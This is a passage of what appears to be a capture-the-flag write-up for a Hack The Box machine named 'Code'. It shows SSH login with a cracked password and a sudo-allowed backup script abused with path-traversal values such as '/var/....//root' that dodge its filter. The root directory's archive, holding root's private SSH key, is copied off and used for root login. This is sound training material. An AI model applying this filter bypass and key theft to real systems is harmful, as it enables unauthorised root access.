2g 0:00:00:00 DONE (2025-05-27 00:20) 5.000g/s 13067Kp/s 13067Kc/s 13575KC/s nafi1993..naerox
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=johncrack %}

<br />
Ssh into the martin account with the password we just cracked.

{% capture sshmartin %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ ssh martin@10.10.11.62                    
The authenticity of host '10.10.11.62 (10.10.11.62)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 26 May 2025 02:21:58 PM UTC

  System load:           0.01
  Usage of /:            57.5% of 5.33GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             234
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe95:c774


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon May 26 14:21:58 2025 from 10.10.16.12
martin@code:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshmartin %}

<br />
Run sudo -l to see a list of command that we can run as sudo.  Ahh...the backy file.

{% capture sudol %}
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudol %}

<br />
On the attack machine, update the task.json since that is what feeds backy.  If we start in the home folder, we can break the `/root` restriction.  We can use the forward slash to break the double .. since that is a blacklisted character.

{% capture updtaskjson %}
{
  "destination": "/home/martin",
  "directories_to_archive": [
    "/home/.\./root"
  ]
}
{% endcapture %}
{% include terminal.html language='json' title='task.json' content=updtaskjson %}

<br />
Transfer the updated task.json file to the victim machine.

{% capture transfertask %}
martin@code:~$ wget 10.10.16.12:8000/task.json
--2025-05-26 14:25:52--  http://10.10.16.12:8000/task.json
Connecting to 10.10.16.12:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 100 [application/json]
Saving to: ‘task.json’

task.json                                                  100%[========================================================================================================================================>]     100  --.-KB/s    in 0s      

2025-05-26 14:25:53 (12.1 MB/s) - ‘task.json’ saved [100/100]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transfertask %}

<br />
When I tried to use that task.json, it failed.  So, let's go find the current task.json, so we can get an idea of the format.

{% capture catorigtaskjson %}
martin@code:~$ ls
backups
martin@code:~$ cd backups
martin@code:~/backups$ ls
code_home_app-production_app_2024_August.tar.bz2  task.json
martin@code:~/backups$ cat task.json
{% endcapture %}

{% capture origtaskjson %}
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
{% endcapture %}

{% include terminal.html language='bash' title='bash' content=catorigtaskjson %}

{% include terminal.html language='json' title='task.json' content=origtaskjson %}

<br />
On the attack machine, update the task.json based on the file we just looked at.

{% capture sectaskjson %}
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/.\\./root"
        ],

        "exclude": [
                ".*"
        ]
}
{% endcapture %}
{% include terminal.html language='json' title='task.json' content=sectaskjson %}

<br />
Transfer the second task.json to the victim machine.

{% capture transfersectaskjson %}
martin@code:~$ wget 10.10.16.25:8000/task.json
--2025-05-28 15:47:39--  http://10.10.16.25:8000/task.json
Connecting to 10.10.16.25:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 249 [application/json]
Saving to: ‘task.json’

task.json                                                  100%[========================================================================================================================================>]     249  --.-KB/s    in 0s      

2025-05-28 15:47:40 (15.7 MB/s) - ‘task.json’ saved [249/249]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transfersectaskjson %}

<br />
Run backy again with the new task file.  Nope.  Failed again.

{% capture runsectaskjson %}
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/05/28 15:47:58 🍀 backy 1.2
2025/05/28 15:47:58 📋 Working with task.json ...
2025/05/28 15:47:58 💤 Nothing to sync
2025/05/28 15:47:58 📤 Archiving: [/home/.\./root]
2025/05/28 15:47:58 📥 To: /home/martin/backups ...
2025/05/28 15:47:58 📦
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runsectaskjson %}

<br />
Update the task.json to remove the exclusion.

{% capture thirdtaskjson %}
martin@code:~$ cat task.json 
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/var/....//root"
  ]
}
{% endcapture %}
{% include terminal.html language='json' title='task.json' content=thirdtaskjson %}

<br />
Run backy again for a third time.

{% capture backythirdrun %}
martin@code:~$ sudo /usr/bin/backy.sh task.json 
2025/06/05 08:55:37 🍀 backy 1.2
2025/06/05 08:55:37 📋 Working with task.json ...
2025/06/05 08:55:37 💤 Nothing to sync
2025/06/05 08:55:37 📤 Archiving: [/var/../root]
2025/06/05 08:55:37 📥 To: /home/martin/backups ...
2025/06/05 08:55:37 📦
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=backythirdrun %}

<br />
Transfer the tarball back to the attack machine.

{% capture transfertar %}
martin@code:~/backups$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ wget 10.10.11.62:8000/code_var_.._root_2025_June.tar.bz2
Prepended http:// to '10.10.11.62:8000/code_var_.._root_2025_June.tar.bz2'
--2025-06-05 18:57:44--  http://10.10.11.62:8000/code_var_.._root_2025_June.tar.bz2
Connecting to 10.10.11.62:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12890 (13K) [application/octet-stream]
Saving to: ‘code_var_.._root_2025_June.tar.bz2’

code_var_.._root_2025_June.tar.bz2                         100%[========================================================================================================================================>]  12.59K  65.9KB/s    in 0.2s    

2025-06-05 18:57:45 (65.9 KB/s) - ‘code_var_.._root_2025_June.tar.bz2’ saved [12890/12890]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transfertar %}

<br />
Unpackage the tar archive.

{% capture unpackagetar %}
┌──(kali㉿kali)-[~/Documents/htb/code]
└─$ tar -xvf code_var_.._root_2025_June.tar.bz2      
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=unpackagetar %}

<br />
Chmod the id_rsa file to 600 since that is what is required by the ssh program.

{% capture chmodidrsa %}
┌──(kali㉿kali)-[~/…/htb/code/root/.ssh]
└─$ chmod 600 id_rsa
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=chmodidrsa %}

<br />
Ssh into the root account with the id_rsa that we just chmodded.

{% capture sshroot %}
┌──(kali㉿kali)-[~/…/htb/code/root/.ssh]
└─$ ssh -i id_rsa root@10.10.11.62            
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu 05 Jun 2025 09:04:26 AM UTC

  System load:           0.0
  Usage of /:            51.5% of 5.33GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             237
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe95:caca


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Jun 5 09:04:27 2025 from 10.10.16.5
root@code:~#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshroot %}

<br />
Get the root flag.

{% capture rootflag %}
root@code:~# cat root.txt
<redacted>
root@code:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:ca:ca brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:caca/64 scope global dynamic mngtmpaddr 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::250:56ff:fe95:caca/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
Excellent!  Looks like we cracked the Code!  See you in the next one!

<br />
<h2>Trophy</h2>
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/code/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>